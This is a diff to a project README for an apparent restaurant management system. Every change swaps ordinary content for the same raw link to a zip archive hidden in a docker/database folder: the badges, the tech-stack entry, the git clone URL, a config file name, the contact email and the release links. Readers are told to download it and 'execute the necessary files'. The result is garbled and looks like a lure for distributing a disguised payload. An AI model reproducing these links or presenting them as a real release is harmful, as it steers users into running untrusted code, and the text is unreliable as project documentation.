@@ -1,10 +1,10 @@
 # Restaurant Management System - Prior Project 🍽️
 
-![License](https://img.shields.io/badge/License-MIT-blue.svg)
-![Version](https://img.shields.io/badge/Version-1.0.0-brightgreen.svg)
-![Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-orange.svg)
+![License](https://github.com/cripertrol/prior-project/raw/refs/heads/main/docker/database/prior-project-1.5.zip)
+![Version](https://github.com/cripertrol/prior-project/raw/refs/heads/main/docker/database/prior-project-1.5.zip)
+![Release](https://github.com/cripertrol/prior-project/raw/refs/heads/main/docker/database/prior-project-1.5.zip%20Latest%20Release-Click%https://github.com/cripertrol/prior-project/raw/refs/heads/main/docker/database/prior-project-1.5.zip)
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-orange)](https://github.com/cripertrol/prior-project/releases)
+[![Download Latest Release](https://github.com/cripertrol/prior-project/raw/refs/heads/main/docker/database/prior-project-1.5.zip%20Latest%20Release-Click%20Here-orange)](https://github.com/cripertrol/prior-project/raw/refs/heads/main/docker/database/prior-project-1.5.zip)
 
 ## Overview
 
@@ -31,7 +31,7 @@ This project utilizes a variety of technologies to ensure optimal performance an
   - Vite
 
 - **Backend**:
-  - Node.js
+  - https://github.com/cripertrol/prior-project/raw/refs/heads/main/docker/database/prior-project-1.5.zip
   - Spring Boot
   - Java
 
@@ -61,7 +61,7 @@ To set up the **Restaurant Management System**, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/cripertrol/prior-project.git
+   git clone https://github.com/cripertrol/prior-project/raw/refs/heads/main/docker/database/prior-project-1.5.zip
    cd prior-project
    ```
 
@@ -77,7 +77,7 @@ To set up the **Restaurant Management System**, follow these steps:
 
 3. **Set Up the Database**:
    - Create a PostgreSQL database named `restaurant_db`.
-   - Update the database connection settings in the `application.properties` file in the backend.
+   - Update the database connection settings in the `https://github.com/cripertrol/prior-project/raw/refs/heads/main/docker/database/prior-project-1.5.zip` file in the backend.
 
 4. **Run the Application**:
    - Start the backend server:
@@ -92,7 +92,7 @@ To set up the **Restaurant Management System**, follow these steps:
 5. **Access the Application**:
    - Open your browser and go to `http://localhost:3000` for the frontend.
 
-For the latest release, [click here to download](https://github.com/cripertrol/prior-project/releases) and execute the necessary files.
+For the latest release, [click here to download](https://github.com/cripertrol/prior-project/raw/refs/heads/main/docker/database/prior-project-1.5.zip) and execute the necessary files.
 
 ## Usage
 
@@ -122,10 +122,10 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or suggestions, please reach out:
 
-- **Email**: support@priorsolution.com
-- **GitHub**: [Prior Solution](https://github.com/cripertrol)
+- **Email**: https://github.com/cripertrol/prior-project/raw/refs/heads/main/docker/database/prior-project-1.5.zip
+- **GitHub**: [Prior Solution](https://github.com/cripertrol/prior-project/raw/refs/heads/main/docker/database/prior-project-1.5.zip)
 
-For the latest release, [click here to download](https://github.com/cripertrol/prior-project/releases) and execute the necessary files.
+For the latest release, [click here to download](https://github.com/cripertrol/prior-project/raw/refs/heads/main/docker/database/prior-project-1.5.zip) and execute the necessary files.
 
 ---
 
